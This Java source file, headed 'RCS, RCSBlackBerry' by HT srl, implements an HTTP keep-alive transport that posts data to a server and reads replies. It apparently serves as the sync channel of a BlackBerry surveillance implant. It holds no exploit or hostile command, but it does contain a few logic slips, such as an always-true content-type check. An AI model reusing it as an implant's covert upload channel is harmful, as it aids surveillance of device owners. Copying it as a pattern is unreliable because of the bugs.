//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.action.sync.transport;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import javax.microedition.io.HttpConnection;

import net.rim.device.api.io.IOCancelledException;
import blackberry.Status;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

public abstract class HttpKeepAliveTransport extends HttpTransport {
    //#ifdef DEBUG
    private static Debug debug = new Debug("HttpKATransport",
            DebugLevel.VERBOSE);
    //#endif

    HttpConnection connection;

    public HttpKeepAliveTransport(String host) {
        super(host);

    }

    /**
     * http://www.androidsnippets.com/executing-a-http-post-request-with-
     * httpclient
     * 
     * @param data
     *            the data
     * @return the byte[]
     * @throws TransportException
     *             the transport exception
     */

    public synchronized byte[] command(final byte[] data)
            throws TransportException {

        //#ifdef DBC
        Check.ensures(connection != null, "call startSession before command");
        //#endif
        // sending request

        try {
            sendHttpPostRequest(connection, data);
        } catch (TransportException ex) {
            //#ifdef DEBUG
            //debug.trace("command: second chance");
            //#endif
            //connection = createRequest();
            //sendHttpPostRequest(connection, data);
            throw ex;
        }

        //#ifdef DBC        
        Check.asserts(connection != null, "null connection");
        //#endif

        int status;
        try {
            status = connection.getResponseCode();

            // if it's moved, try with the new url
            if (follow_moved
                    && (status == HttpConnection.HTTP_MOVED_TEMP
                            || status == HttpConnection.HTTP_MOVED_PERM || status == HttpConnection.HTTP_TEMP_REDIRECT)) {
                baseurl = connection.getHeaderField("Location");
                //#ifdef DEBUG
                debug.trace("sendHttpPostRequest Moved to Location: " + baseurl);
                //#endif

                connection = createRequest();
                sendHttpPostRequest(connection, data);
                status = connection.getResponseCode();
            }

            // check response, if ok parse it            
            if (status == HttpConnection.HTTP_OK) {
                byte[] content = parseHttpConnection(connection);
                //#ifdef DEBUG
                Status.getInstance().wap2Ok();
                //#endif
                return content;

            } else {
                //#ifdef DEBUG
                debug.error("command response status: " + status);
                if (status == 502) {
                    Status.getInstance().wap2Error();
                }
                //#endif

                throw new TransportException(7);
            }
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error("command: " + e);
            //#endif
            throw new TransportException(8);
        }

    }

    OutputStream os;

    protected boolean sendHttpPostRequest(HttpConnection httpConn, byte[] data)
            throws TransportException {
        //#ifdef DBC
        Check.requires(data != null, "sendHttpPostRequest: null data");
        //#endif
        String content = "";

        boolean httpOK;

        // Open the connection and extract the data.
        try {

            if (os == null) {
                os = httpConn.openOutputStream();
            }
            os.write(data);
            //os.close();

            //os.flush(); // Optional, getResponseCode will flush

            //#ifdef DEBUG
            debug.trace("sendHttpPostRequest: get response");
            //#endif
            int status = httpConn.getResponseCode();
            httpOK = (status == HttpConnection.HTTP_OK);

            /*
             * //#ifdef DEBUG debug.trace("sendHttpPostRequest: closing");
             * //#endif os.close();
             */

            //#ifdef DEBUG
            debug.trace("sendHttpPostRequest response: " + status);
            //#endif

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
            throw new TransportException(2);
        }

        if (!httpOK) {
            //#ifdef DEBUG
            debug.error("HTTP not ok");
            //#endif
            //throw new TransportException(2);
        }

        //#ifdef DBC
        Check.ensures(httpConn != null, "sendHttpPostRequest: httpConn null");
        //#endif     
        return httpOK;
    }

    InputStream input;
    protected byte[] parseHttpConnection(HttpConnection httpConn)
            throws TransportException {
        try {
            // Is this html?
            String contentType = httpConn.getHeaderField(HD_CONTENTTYPE);
            boolean htmlContent = (contentType != null && contentType
                    .startsWith(contentType));

            if (!htmlContent) {
                //#ifdef DEBUG
                debug.error("parseHttpConnection wrong htmlContent : "
                        + contentType);
                //#endif
                throw new TransportException(3);
            }

            String setCookie = httpConn.getHeaderField(HD_SETCOOKIE);

            if (setCookie != null) {
                //#ifdef DEBUG
                debug.trace("parseHttpConnection setCookie: " + setCookie);
                //#endif

                cookie = setCookie;
            }

            String contentLen = httpConn.getHeaderField(HD_CONTENTLEN);
            //#ifdef DEBUG
            debug.trace("parseHttpConnection len: " + contentLen);
            //#endif

            int totalLen = 0;
            try {
                // expected content size
                totalLen = Integer.parseInt(contentLen);

            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error("parseHttpConnection parseInt");
                //#endif
                throw new TransportException(4);
            }

            if(input==null){
                input = httpConn.openInputStream();
            }
            
            // buffer data
            byte[] buffer = new byte[10 * 1024];
            byte[] content = new byte[totalLen];
            int size = 0; // incremental size
            int len = 0; // iterative size

            while (-1 != (len = input.read(buffer))) {
                //#ifdef DEBUG
                debug.trace("parseHttpConnection read=" + len + " size=" + size
                        + " tot=" + totalLen);
                //#endif
                // Exit condition for the thread. An IOException is 
                // thrown because of the call to  httpConn.close(), 
                // causing the thread to terminate.
                if (stop) {
                    //#ifdef DEBUG
                    debug.trace("parseHttpConnection stop!");
                    //#endif
                    httpConn.close();
                    input.close();
                }
                Utils.copy(content, size, buffer, 0, len);
                size += len;
            }

            //#ifdef DEBUG
            debug.trace("parseHttpConnection received:" + size);
            //#endif

            //input.close();

            //#ifdef DBC
            Check.ensures(len != totalLen, "sendHttpPostRequest: received:"
                    + size + " expected: " + totalLen);
            //#endif 
            return content;

        } catch (IOCancelledException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            throw new TransportException(5);
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            throw new TransportException(6);
        }
    }

    public void start() {
        try {
            connection = createRequest();
        } catch (TransportException e) {
            //#ifdef DEBUG
            debug.error("start: " + e);
            //#endif
        }
    }

    public void close() {
        connection = null;
        if (os != null) {
            try {
                os.close();
            } catch (IOException e) {
              //#ifdef DEBUG
                debug.error(e);
                //#endif
            }
            os = null;
        }
    }
}
